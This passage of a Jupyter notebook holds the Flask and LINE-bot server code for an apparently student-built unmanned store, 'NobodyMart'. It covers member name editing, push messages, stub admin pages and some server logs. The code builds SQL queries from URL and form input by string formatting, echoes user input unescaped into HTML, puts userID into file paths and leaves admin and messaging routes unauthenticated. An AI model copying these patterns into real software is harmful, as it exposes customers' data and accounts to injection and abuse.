    "    \"\"\"%(userID, server_url)\n",
    "    # body\n",
    "    outStr += \"\"\"\n",
    "    <body>\n",
    "    <script src=\"https://%s/food/web_js_css/jquery.min.js\"></script>\n",
    "    <script src=\"https://%s/food/web_js_css/jquery.flexslider.js\"></script>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    <div class=\"col-lg-9 col-loutStrrrset-9\">\n",
    "    \"\"\"%(server_url, server_url)\n",
    "    # body-table\n",
    "    outStr += \"\"\"\n",
    "    <table class=\"table\" style=\"font-size:30px;font-family:serif;\">\n",
    "                <thead>\n",
    "                    <tr class=\"danger\">\n",
    "                        <th>No.</th>\n",
    "                        <th>Product Name</th>\n",
    "                        <th>Quantity</th>\n",
    "                        <th>Unit Price</th>\n",
    "                        <th>Subtotal</th>\n",
    "                    </tr>\n",
    "                </thead>    \n",
    "    \"\"\"\n",
    "    # tbody\n",
    "    outStr += \"\"\"\n",
    "    <tbody>\n",
    "    \"\"\"\n",
    "    # 及時交易紀錄\n",
    "    tcolor = [\"success\", \"warning\"]\n",
    "    '''outStr += \"\"\"\n",
    "    <tr class=\"success\">\n",
    "        <td>1</td>\n",
    "        <td>Salt</td>\n",
    "        <td>1</td>\n",
    "        <td>$ 40</td>\n",
    "        <td>$ 40</td>\n",
    "    </tr>\n",
    "    <tr class=\"warning\">\n",
    "        <td>2</td>\n",
    "        <td>Egg</td>\n",
    "        <td>3</td>\n",
    "        <td>$ 30</td>\n",
    "        <td>$ 90</td>\n",
    "    </tr>\n",
    "    <tr class=\"success\">\n",
    "        <td>3</td>\n",
    "        <td>Chicken</td>\n",
    "        <td>1</td>\n",
    "        <td>$ 150</td>\n",
    "        <td>$ 150</td>\n",
    "    </tr>\n",
    "    <tr class=\"warning\">\n",
    "        <td>4</td>\n",
    "        <td>OliveOil</td>\n",
    "        <td>1</td>\n",
    "        <td>$ 120</td>\n",
    "        <td>$ 120</td>\n",
    "    </tr>\n",
    "    \"\"\"'''\n",
    "    with open('./transaction_status/%s'%(userID), 'r', encoding='utf-8') as f:\n",
    "        outStr += f.read()\n",
    "    \n",
    "    '''outStr += \"\"\"\n",
    "    <thead>\n",
    "        <tr class=\"danger\">\n",
    "        <th>Total</th>\n",
    "        <th>-</th>\n",
    "        <th>-</th>\n",
    "        <th>-</th>\n",
    "        <th>$ null</th>\n",
    "        </tr>\n",
    "    </thead>\n",
    "    \"\"\"'''\n",
    "    \n",
    "    # /tbody /table\n",
    "    outStr += \"\"\"\n",
    "    </tbody>\n",
    "    </table>\n",
    "    \"\"\"\n",
    "    \n",
    "    # carousel\n",
    "    outStr += \"\"\"\n",
    "    <br><br>\n",
    "    <div style=\"margin:0 auto;\"><h1><p align=center>-  On-sale products  -</p><h1></div>\n",
    "    <div class=\"container\">\n",
    "    <script type=\"text/javascript\">\n",
    "    $(window).load(function() {\n",
    "    $('.flexslider').flexslider({\n",
    "          slideshowSpeed: 5000,\n",
    "          animationSpeed: 500,\n",
    "          animation: \"slide\",\n",
    "          touch: true\n",
    "          });\n",
    "    });\n",
    "    </script>\n",
    "    <div class=\"flexslider\" style=\"width:450px;  margin:0 auto;\">\n",
    "    <ul class=\"slides\">\n",
    "        <li><img src=\"https://pgw.udn.com.tw/gw/photo.php?u=https://uc.udn.com.tw/photo/2018/05/29/draft/4804805.jpeg&x=0&y=0&sw=0&sh=0&exp=3600\" alt=\"\" width=\"350\" height=\"200\"></li>\n",
    "        <li><img src=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQgszxK4wWxfhfCokY5PwlL52bzi6FTa7vILrrewvOPW6-jDeYGzg\" alt=\"\" width=\"350\" height=\"200\"></li>\n",
    "        <li><img src=\"https://www.foodnext.net/dispPageBox/getFile/GetImg.aspx?FileLocation=/PJ-FOODNEXT/Files/&FileName=photo-08083-i.jpg\" alt=\"\" width=\"350\" height=\"200\"></li>\n",
    "    </ul>\n",
    "    </div>\n",
    "    </div>\n",
    "    \"\"\"\n",
    "    \n",
    "    # logo image\n",
    "    outStr += \"\"\"\n",
    "    <div class=\"container\">\n",
    "    <img class=\"img-responsive\" src=\"https://%s/food/logo.png\">\n",
    "    </div>\n",
    "    \"\"\"%(server_url)\n",
    "    # /body\n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </div>\n",
    "    </body>\n",
    "    \"\"\"\n",
    "    \n",
    "    # test\n",
    "    '''outStr = \"\"\"\"\"\"\n",
    "    with open('./transaction_status/%s'%(userID), 'r', encoding='utf-8') as f:\n",
    "        outStr += f.read()'''\n",
    "    \n",
    "    return outStr"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 會員中心"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "會員中心資料修改\n",
    "\n",
    "'''\n",
    "\n",
    "@app.route('/usercentre/<userID>', methods=['GET'])\n",
    "def getdata(userID):\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>   \n",
    "    \n",
    "    <title>USER CENTRE</title>\n",
    "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "    <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    \n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    <script type=\"text/javascript\">\n",
    "    function ValidateValue(textbox) {\n",
    "        var IllegalString = \"[`~!#$^&*()=|{}':;',\\\\[\\\\].<>/?~！#￥……&*（）——|{}【】‘；：”“'。，、？]‘'\";\n",
    "        var textboxvalue = textbox.value;\n",
    "        var index = textboxvalue.length - 1;\n",
    "        var s = textbox.value.charAt(index);\n",
    "        if (IllegalString.indexOf(s) >= 0) {\n",
    "        s = textboxvalue.substring(0, index);\n",
    "        textbox.value = s;\n",
    "        }\n",
    "    }\n",
    "    </script>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "        <thead>\n",
    "        <th>\n",
    "        Hello, your name is ?\n",
    "        </th>\n",
    "        </thead>\n",
    "        </table>\n",
    "    <p></p>\n",
    "    <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "    <thead>\n",
    "    <th>\n",
    "        <form action=\"/usercentre/%s\" method=\"post\">\n",
    "         <label>Name:</label>\n",
    "         <input type=\"textbox\" name=\"username\" onkeyup = \"ValidateValue(this)\">\n",
    "         <input type=\"submit\" value=\"Submit\">\n",
    "        </form>\n",
    "    </th>\n",
    "    </thead>\n",
    "    </table>\n",
    "    </div>\n",
    "    </body>\n",
    "    </html>\n",
    "    \"\"\"%(userID)\n",
    "    #return render_template('text.html')\n",
    "    return outStr\n",
    "\n",
    "@app.route('/usercentre/<userID>', methods=['POST'])\n",
    "def submit(userID):\n",
    "    name = request.form.get('username')\n",
    "    print(name)\n",
    "    print('Find \\\\ ', ('\\\\' in name), ' , in submit')\n",
    "    \n",
    "    content = \"\"\"\n",
    "    Please try a shorter name.\n",
    "    <br>\n",
    "    <input type=\"button\" value=\"Return\" onclick=\"location.href='https://%s/usercentre/%s'\">\n",
    "    \"\"\"%(server_url, userID)\n",
    "    \n",
    "    if ('\\\\' in name) or (len(name) == 0):\n",
    "        name = \"ErrorTyping\"\n",
    "        content = \"\"\"\n",
    "        Please type regular words (\\).\n",
    "        <br>\n",
    "        <input type=\"button\" value=\"Return\" onclick=\"location.href='https://%s/usercentre/%s'\">\n",
    "        \"\"\"%(server_url, userID)\n",
    "    elif len(name.encode('unicode-escape').decode('utf-8').replace('\\\\','\\\\\\\\')) < 39 :\n",
    "        content = \"\"\"Your user name has been modified to <br>%s !\"\"\"%(name)\n",
    "        cursor.execute(\"UPDATE membersInfo SET name='%s' WHERE userID='%s'\"%(name.encode('unicode-escape').decode('utf-8').replace('\\\\','\\\\\\\\'), userID))\n",
    "        conn.commit()    \n",
    "    \n",
    "    outStr = \"\"\"\n",
    "    <html>\n",
    "    <head>   \n",
    "    \n",
    "    <title>USER CENTRE</title>\n",
    "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "    \n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    \n",
    "    <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "    <thead>\n",
    "    <th>\n",
    "    %s\n",
    "    </th>\n",
    "    </thead>\n",
    "    </table>\n",
    "    \n",
    "    </body>\n",
    "    </html>\n",
    "    \"\"\"%(content)\n",
    "    return outStr"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Push message\n",
    "## 管理員回復訊息\n",
    "## 交易結束推播訊息"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "Push message\n",
    "Reply message manually\n",
    "\n",
    "'''\n",
    "from linebot import LineBotApi\n",
    "from linebot.models import TextSendMessage\n",
    "from linebot.exceptions import LineBotApiError\n",
    "\n",
    "@app.route('/pushMessage/<userID>/<sendText>', methods=['GET'])\n",
    "def pushMessageDemo(userID, sendText):\n",
    "    try:\n",
    "        line_bot_api.push_message(userID, TextSendMessage(text='%s'%(sendText)))\n",
    "    except LineBotApiError as e:\n",
    "        # error handle\n",
    "        print('Push Error.')\n",
    "    \n",
    "    return 'Done.'\n",
    "\n",
    "# reply\n",
    "@app.route('/pushMessage/<userID>', methods=['GET'])\n",
    "def replyMessageManually(userID):\n",
    "    \n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>   \n",
    "    \n",
    "    <title>REPLY</title>\n",
    "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "    \n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    \n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "        <thead>\n",
    "        <th>\n",
    "        Say something\n",
    "        </th>\n",
    "        </thead>\n",
    "        </table>\n",
    "    <p></p>\n",
    "    <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "    <thead>\n",
    "    <th>\n",
    "        <form action=\"/pushMessage/%s\" method=\"post\">\n",
    "         <label>Reply:</label>\n",
    "         <input type=\"textbox\" name=\"replyMessage\">\n",
    "         <input type=\"submit\" value=\"Submit\">\n",
    "        </form>\n",
    "    </th>\n",
    "    </thead>\n",
    "    </table>\n",
    "    </div>\n",
    "    </body>\n",
    "    </html>\n",
    "    \"\"\"%(userID)\n",
    "    \n",
    "    return outStr\n",
    "@app.route('/pushMessage/<userID>', methods=['POST'])\n",
    "def sendReplyMessage(userID):\n",
    "    replyMessage = request.form.get('replyMessage')\n",
    "    replyStatus = \"Sent.\"\n",
    "    try:\n",
    "        line_bot_api.push_message(userID, TextSendMessage(text='%s'%(replyMessage)))\n",
    "    except LineBotApiError as e:\n",
    "        # error handle\n",
    "        replyStatus = \"Error!\"\n",
    "        print('Push Error.')\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>   \n",
    "    \n",
    "    <title>REPLY</title>\n",
    "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "    \n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    \n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "        <thead>\n",
    "        <th>\n",
    "        %s\n",
    "        </th>\n",
    "        </thead>\n",
    "        </table>\n",
    "        <p></p>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "        <thead>\n",
    "        <th>\n",
    "            <form action=\"/pushMessage/%s\" method=\"post\">\n",
    "             <label>Reply:</label>\n",
    "             <input type=\"textbox\" name=\"replyMessage\">\n",
    "             <input type=\"submit\" value=\"Submit\">\n",
    "            </form>\n",
    "        </th>\n",
    "        </thead>\n",
    "        </table>\n",
    "    </div>\n",
    "    </body>\n",
    "    </html>\n",
    "    \"\"\"%(replyStatus, userID)\n",
    "    \n",
    "    return outStr\n",
    "\n",
    "@app.route('/transaction_commit/<userID>')\n",
    "def commit_data_and_push(userID):\n",
    "    conn.commit()\n",
    "    #conn.reconnect()\n",
    "    \n",
    "    cursor.execute(\"SELECT datetime FROM transaction WHERE userID = '%s' GROUP BY orderID DESC LIMIT 1\"%(userID))\n",
    "    transaction_data = cursor.fetchall()\n",
    "    # 將交易紀錄資料送入flex轉換的transaction_history.py python程式\n",
    "    flexBubbleContainerJsonString_transaction_data = transaction_history.transaction_flex(userID, server_url, transaction_data)\n",
    "    bubbleContainer_transaction_data= BubbleContainer.new_from_json_dict(json.loads(flexBubbleContainerJsonString_transaction_data))\n",
    "    FlexSendMessage(alt_text=\"Transaction history\", contents=bubbleContainer_transaction_data)\n",
    "    \n",
    "    #replyStatus = \"Sent.\"\n",
    "    try:\n",
    "        line_bot_api.push_message(userID, [FlexSendMessage(alt_text=\"Transaction history\", contents=bubbleContainer_transaction_data),\n",
    "                                          TextSendMessage(text='感謝您的光臨，您可於上方表單查看最新交易紀錄。')])\n",
    "        print('From : %s\\nTransaction Completed!'%(userID))\n",
    "    except LineBotApiError as e:\n",
    "        # error handle\n",
    "        #replyStatus = \"Error!\"\n",
    "        print('Push Error.')\n",
    "    \n",
    "    return 'Done.'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Kafka專用"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "From face PI\n",
    "Push message\n",
    "Reply message manually\n",
    "\n",
    "'''\n",
    "from linebot import LineBotApi\n",
    "from linebot.models import TextSendMessage, ImageSendMessage\n",
    "from linebot.exceptions import LineBotApiError\n",
    "\n",
    "\n",
    "@app.route('/tryagain/<userID>', methods=['GET'])\n",
    "def pushTryagain(userID):\n",
    "    try:\n",
    "        line_bot_api.push_message(userID, TextSendMessage(text='人臉辨識錯誤！請重新掃描QRcode！'))\n",
    "    except LineBotApiError as e:\n",
    "        # error handle\n",
    "        print('Push Error.')\n",
    "    \n",
    "    return 'Done.'\n",
    "\n",
    "@app.route('/welcom/<userID>', methods=['GET'])\n",
    "def pushWelcom(userID):\n",
    "    try:\n",
    "        line_bot_api.push_message(userID, \n",
    "                                  [\n",
    "                                      TextSendMessage(text='歡迎光臨NobodyMart！您可以點擊下方[NobodyMartMenu] -> [本次交易] 查看本次交易的購物車。'),\n",
    "                                      ImageSendMessage(original_content_url='https://%s/food/transaction_now.png' %(server_url),\n",
    "                                         preview_image_url='https://%s/food/transaction_now.png' %(server_url))\n",
    "                                  ]\n",
    "                                 )\n",
    "    except LineBotApiError as e:\n",
    "        # error handle\n",
    "        print('Push Error.')\n",
    "    \n",
    "    # Write userID to a textfile\n",
    "    outStr = \"\"\"\n",
    "    <html>\n",
    "        <head>\n",
    "            <title>%s</title>\n",
    "        </head>\n",
    "        <body>\n",
    "            <div>%s</div>\n",
    "        </body>\n",
    "    </html>\n",
    "    \"\"\"%(userID, userID)\n",
    "    with open('./templates/userNow', 'w', encoding='utf-8') as h:\n",
    "        h.write(outStr)\n",
    "    \n",
    "    return 'Done.'\n",
    "\n",
    "@app.route('/welcom', methods=['GET'])\n",
    "def topicName():\n",
    "    #from flask import render_template\n",
    "    #return render_template('userNow.html')\n",
    "    \n",
    "    outStr = \"\"\"\"\"\"\n",
    "    \n",
    "    with open('./templates/userNow', 'r', encoding='utf-8') as h:\n",
    "        outStr = h.read()\n",
    "        \n",
    "    return outStr\n",
    "\n",
    "@app.route('/qrcode/<userID>', methods=['GET'])\n",
    "def pushQRcodeWelcom(userID):\n",
    "    cursor.execute(\"SELECT name FROM membersInfo WHERE userID='%s'\"%(userID))\n",
    "    username = cursor.fetchone()['name'].encode('utf-8').decode('unicode-escape')\n",
    "    try:\n",
    "        line_bot_api.push_message(userID, TextSendMessage(text='Hi～%s，歡迎光臨NobodyMart，請看著鏡頭做臉部辨識，以進行雙重確認。'%(username)))\n",
    "    except LineBotApiError as e:\n",
    "        # error handle\n",
    "        print('Push Error.')\n",
    "    return 'Done'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 管理員專區"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "Administrator\n",
    "商品庫存管理\n",
    "會員資料查詢\n",
    "會員交易紀錄查詢\n",
    "客流量分析\n",
    "商品熱度圖\n",
    "\n",
    "'''\n",
    "\n",
    "@app.route('/administrator', methods=['GET'])\n",
    "def administrator_only():\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>\n",
    "        <title>ADMINISTRATOR</title>\n",
    "        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "        <!--meta name=\"viewpoutStr\" content=\"width=device-width, initial-scale=1.0\"-->\n",
    "        <!--meta http-equiv=\"refresh\" content=\"0;url=http://%s/passengerFlows\"/-->\n",
    "        <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <h1>UNDER CONSTRUCTION!</h1>\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <br>\n",
    "        \n",
    "    </div>\n",
    "    \"\"\"\n",
    "    \n",
    "    # 商品庫存管理\n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"商品庫存管理\" onclick=\"location.href='http://%s/productStorage'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <br>       \n",
    "    </div>    \n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    # 會員資料查詢\n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"會員資料查詢\" onclick=\"location.href='http://%s/memberInformation'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <br>       \n",
    "    </div>     \n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    # 會員交易紀錄查詢\n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"會員交易紀錄查詢\" onclick=\"location.href='http://%s/memberTransaction'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <br>       \n",
    "    </div> \n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    # 客流量分析\n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"客流量分析\" onclick=\"location.href='http://%s/passengerFlows'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <br>       \n",
    "    </div> \n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    # 商品熱度圖\n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"商品熱度圖\" onclick=\"location.href='http://%s/productHeatMap'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <br>       \n",
    "    </div> \n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </body>\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </html>\n",
    "    \"\"\"\n",
    "    \n",
    "    return outStr\n",
    "\n",
    "### 商品庫存管理\n",
    "@app.route('/productStorage', methods=['GET'])\n",
    "def productStorage():\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>\n",
    "        <title>UNDER CONSTRUCTION</title>\n",
    "        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "        <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <h1>UNDER CONSTRUCTION!</h1>\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        \n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"Return\" onclick=\"location.href='https://%s/administrator'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "    </div>\n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </body>\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </html>\n",
    "    \"\"\"\n",
    "    \n",
    "    return outStr\n",
    "\n",
    "### 會員資料查詢\n",
    "@app.route('/memberInformation', methods=['GET'])\n",
    "def memberInformation():\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>\n",
    "        <title>UNDER CONSTRUCTION</title>\n",
    "        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "        <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <h1>UNDER CONSTRUCTION!</h1>\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        \n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"Return\" onclick=\"location.href='https://%s/administrator'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "    </div>\n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </body>\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </html>\n",
    "    \"\"\"\n",
    "    \n",
    "    return outStr\n",
    "\n",
    "### 會員交易紀錄查詢\n",
    "@app.route('/memberTransaction', methods=['GET'])\n",
    "def memberTransaction():\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>\n",
    "        <title>UNDER CONSTRUCTION</title>\n",
    "        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "        <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <h1>UNDER CONSTRUCTION!</h1>\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        \n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"Return\" onclick=\"location.href='https://%s/administrator'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "    </div>\n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </body>\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </html>\n",
    "    \"\"\"\n",
    "    \n",
    "    return outStr\n",
    "\n",
    "### 客流量分析\n",
    "@app.route('/passengerFlows', methods=['GET'])\n",
    "def passengerFlows():\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>\n",
    "        <title>UNDER CONSTRUCTION</title>\n",
    "        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "        <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <h1>UNDER CONSTRUCTION!</h1>\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <br>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <iframe src=\"http://35.220.196.201:3000/d-solo/LBpjwjjmk/nobodymart?orgId=1&panelId=2\" width=\"350\" height=\"200\" frameborder=\"0\"></iframe>\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"Return\" onclick=\"location.href='https://%s/administrator'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "    </div>\n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </body>\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </html>\n",
    "    \"\"\"\n",
    "    \n",
    "    return outStr\n",
    "\n",
    "### 商品熱度圖\n",
    "@app.route('/productHeatMap', methods=['GET'])\n",
    "def productHeatMap():\n",
    "    outStr = \"\"\"\n",
    "    <!doctype html>\n",
    "    <html>\n",
    "    <head>\n",
    "        <title>UNDER CONSTRUCTION</title>\n",
    "        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n",
    "        <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    </head>\n",
    "    \n",
    "    <body>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    <div>\n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <h1>UNDER CONSTRUCTION!</h1>\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        \n",
    "        \n",
    "        <br>\n",
    "        \n",
    "        <table class=\"table\" style=\"font-family:serif;margin:0 auto;\">\n",
    "            <thead>\n",
    "                <th>\n",
    "                    <input type=\"button\" value=\"Return\" onclick=\"location.href='https://%s/administrator'\">\n",
    "                </th>\n",
    "            </thead>\n",
    "        </table>\n",
    "    </div>\n",
    "    \"\"\"%(server_url)\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </body>\n",
    "    \"\"\"\n",
    "    \n",
    "    outStr += \"\"\"\n",
    "    </html>\n",
    "    \"\"\"\n",
    "    \n",
    "    return outStr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\n",
      "192.168.224.4 - - [14/Mar/2019 04:08:55] \"GET /food/U7173dc299af6ac3fe7697a75c2a280ad.jpg HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 04:09:02] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:09:10] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:09:12] \"GET /productStorage HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:09:14] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 04:09:15] \"GET /memberTransaction HTTP/1.1\" 200 -\n",
